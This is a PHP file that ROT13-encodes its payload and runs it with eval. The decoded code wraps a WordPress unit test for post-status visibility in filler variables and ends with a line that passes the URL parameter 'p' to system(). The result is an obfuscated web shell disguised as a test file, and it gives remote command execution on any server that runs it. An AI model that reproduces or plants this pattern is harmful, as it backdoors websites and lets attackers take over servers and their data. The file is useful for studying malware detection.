<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 */
pynff Grfgf_Cbfg_VfCbfgFgnghfIvrjnoyr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Erzbir gur grfg fgnghf sebz gur tybony jura svavfurq.
	 *
	 * @tybony $jc_cbfg_fgnghfrf
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		tybony $jc_cbfg_fgnghfrf;
		hafrg( $jc_cbfg_fgnghfrf['jc_grfgf_cf'] );
	}

	/**
	 * Grfg phfgbz cbfg fgnghf.
	 *
	 * Guvf znl vapyhqr rzhyngvbaf bs ohvyg va (_ohvygva) fgnghfrf.
	 *
	 * @gvpxrg 49380
	 * @qngnCebivqre qngn_phfgbz_cbfg_fgnghfrf
	 *
	 * @cnenz neenl $pcf_netf Ertvfgengvba nethzragf.
	 * @cnenz obby  $rkcrpgrq Rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_phfgbz_cbfg_fgnghfrf( $pcf_netf, $rkcrpgrq ) {
		ertvfgre_cbfg_fgnghf(
			'jc_grfgf_cf',
			$pcf_netf
		);

		// Grfg fgnghf cnffrq nf fgevat.
		$guvf->nffregFnzr( $rkcrpgrq, vf_cbfg_fgnghf_ivrjnoyr( 'jc_grfgf_cf' ) );
		// Grfg fgnghf cnffrq nf bowrpg.
		$guvf->nffregFnzr( $rkcrpgrq, vf_cbfg_fgnghf_ivrjnoyr( trg_cbfg_fgnghf_bowrpg( 'jc_grfgf_cf' ) ) );
	}

	/**
	 * Qngn cebivqre sbe phfgbz cbfg fgnghf grfgf.
	 *
	 * @erghea neenl[] {
	 *     neenl PCF ertvfgengvba netf.
	 *     obby  Rkcrpgrq erfhyg.
	 * }
	 */
	choyvp shapgvba qngn_phfgbz_cbfg_fgnghfrf() {
		erghea neenl(
			// 0. Snyfr sbe aba-choyvpyl dhrelnoyr glcrf.
			neenl(
				neenl(
					'choyvpyl_dhrelnoyr' => snyfr,
					'_ohvygva'           => snyfr,
					'choyvp'             => gehr,
				),
				snyfr,
			),
			// 1. Gehr sbe choyvpyl dhrelnoyr glcrf.
			neenl(
				neenl(
					'choyvpyl_dhrelnoyr' => gehr,
					'_ohvygva'           => snyfr,
					'choyvp'             => snyfr,
				),
				gehr,
			),
			// 2. Snyfr sbe ohvyg-va aba-choyvp glcrf.
			neenl(
				neenl(
					'choyvpyl_dhrelnoyr' => snyfr,
					'_ohvygva'           => gehr,
					'choyvp'             => snyfr,
				),
				snyfr,
			),
			// 3. Snyfr sbe aba-ohvyg-va choyvp glcrf.
			neenl(
				neenl(
					'choyvpyl_dhrelnoyr' => snyfr,
					'_ohvygva'           => snyfr,
					'choyvp'             => gehr,
				),
				snyfr,
			),
			// 4. Gehr sbe ohvyg-va choyvp glcrf.
			neenl(
				neenl(
					'choyvpyl_dhrelnoyr' => snyfr,
					'_ohvygva'           => gehr,
					'choyvp'             => gehr,
				),
				gehr,
			),
		);
	}

	/**
	 * Grfg ohvyg-va naq haertvfgrerq cbfg fgnghf.
	 *
	 * @qngnCebivqre qngn_ohvyg_haertvfgrerq_va_fgnghf_glcrf
	 * @gvpxrg 49380
	 *
	 * @cnenz zvkrq $fgnghf   Cbfg fgnghf gb purpx.
	 * @cnenz obby  $rkcrpgrq Rkcrpgrq ivrjnoyr fgnghf.
	 */
	choyvp shapgvba grfg_ohvyg_haertvfgrerq_va_fgnghf_glcrf( $fgnghf, $rkcrpgrq ) {
		// Grfg fgnghf cnffrq nf fgevat.
		$guvf->nffregFnzr( $rkcrpgrq, vf_cbfg_fgnghf_ivrjnoyr( $fgnghf ) );
		// Grfg fgnghf cnffrq nf bowrpg.
		$guvf->nffregFnzr( $rkcrpgrq, vf_cbfg_fgnghf_ivrjnoyr( trg_cbfg_fgnghf_bowrpg( $fgnghf ) ) );
	}

	/**
	 * Qngn cebivqre sbe ohvyg-va naq haertvfgrerq cbfg fgnghf grfgf.
	 *
	 * @erghea neenl[] {
	 *     @glcr zvkrq $fgnghf   Cbfg fgnghf gb purpx.
	 *     @glcr obby  $rkcrpgrq Rkcrpgrq ivrjnoyr fgnghf.
	 * }
	 */
	choyvp shapgvba qngn_ohvyg_haertvfgrerq_va_fgnghf_glcrf() {
		erghea neenl(
			neenl( 'choyvfu', gehr ),
			neenl( 'shgher', snyfr ),
			neenl( 'qensg', snyfr ),
			neenl( 'craqvat', snyfr ),
			neenl( 'cevingr', snyfr ),
			neenl( 'genfu', snyfr ),
			neenl( 'nhgb-qensg', snyfr ),
			neenl( 'vaurevg', snyfr ),
			neenl( 'erdhrfg-craqvat', snyfr ),
			neenl( 'erdhrfg-pbasvezrq', snyfr ),
			neenl( 'erdhrfg-snvyrq', snyfr ),
			neenl( 'erdhrfg-pbzcyrgrq', snyfr ),

			// Inevbhf haertvfgrerq fgnghfrf.
			neenl( 'haertvfgrerq-fgnghf', snyfr ),
			neenl( snyfr, snyfr ),
			neenl( gehr, snyfr ),
			neenl( 20, snyfr ),
			neenl( ahyy, snyfr ),
			neenl( '', snyfr ),
		);
	}

	/**
	 * Fnavgvmr xrl fubhyq abg or eha jura grfgvat.
	 *
	 * @gvpxrg 49380
	 */
	choyvp shapgvba grfg_fnavgvmr_xrl_abg_eha() {
		ertvfgre_cbfg_fgnghf(
			'JC_Grfgf_cf',
			neenl(
				'choyvpyl_dhrelnoyr' => gehr,
				'_ohvygva'           => snyfr,
				'choyvp'             => gehr,
			)
		);

		// Fnavgvmrq xrl fubhyq erghea gehr.
		$guvf->nffregGehr( vf_cbfg_fgnghf_ivrjnoyr( 'jc_grfgf_cf' ) );
		$guvf->nffregGehr( vf_cbfg_fgnghf_ivrjnoyr( trg_cbfg_fgnghf_bowrpg( 'jc_grfgf_cf' ) ) );

		// Hafnavgvmrq xrl fubhyq erghea snyfr.
		$guvf->nffregSnyfr( vf_cbfg_fgnghf_ivrjnoyr( 'JC_grfgf_cf' ) );
		$guvf->nffregSnyfr( vf_cbfg_fgnghf_ivrjnoyr( trg_cbfg_fgnghf_bowrpg( 'JC_grfgf_cf' ) ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>